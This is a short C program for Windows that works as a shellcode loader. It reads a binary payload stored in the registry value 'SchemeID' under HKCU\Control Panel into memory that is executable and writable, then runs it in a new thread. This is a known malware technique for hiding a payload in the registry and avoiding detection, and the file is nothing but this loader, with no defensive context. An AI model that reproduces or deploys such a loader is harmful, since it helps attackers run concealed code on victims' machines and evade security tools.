#include <stdio.h>
#include<Windows.h>
#define WRITEMODE
#define REGISTRY "Control Panel"
#define REGSTRING "SchemeID"
int main(int argc, char* argv[])
{
    PVOID pShellcodeAddress = NULL;
    PBYTE pBytes; 
    DWORD shellcodeSize = 1024;
    LSTATUS STATUS;
    HANDLE hKey = NULL;
    // pBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, shellcodeSize);// we could either save it in heap and then copy it to another memory space which is allocated with virtualalloc, or we can directly just add it to that space
    pShellcodeAddress = VirtualAlloc(NULL,shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    STATUS = RegGetValueA(HKEY_CURRENT_USER,REGISTRY,REGSTRING,RRF_RT_ANY,0,pShellcodeAddress,&shellcodeSize);
    if (ERROR_SUCCESS != STATUS) {
        printf("[!] RegGetValueA Failed With Error : %d\n", STATUS);
        return EXIT_FAILURE;
    
    }
   
    if (pShellcodeAddress ==  NULL)
    {
        printf("virtual alloc error %d\n",GetLastError());
    }
    // memcpy(pShellcodeAddress, pBytes, shellcodeSize);
    // memset(pBytes, '\0', shellcodeSize);

    if (CreateThread(NULL,0,pShellcodeAddress,NULL,0,NULL) == NULL)
    {
        printf("thread error %d\n",GetLastError());
    }
    printf("[#] Press <Enter> To Quit ... ");
    getchar();
    return 0;
}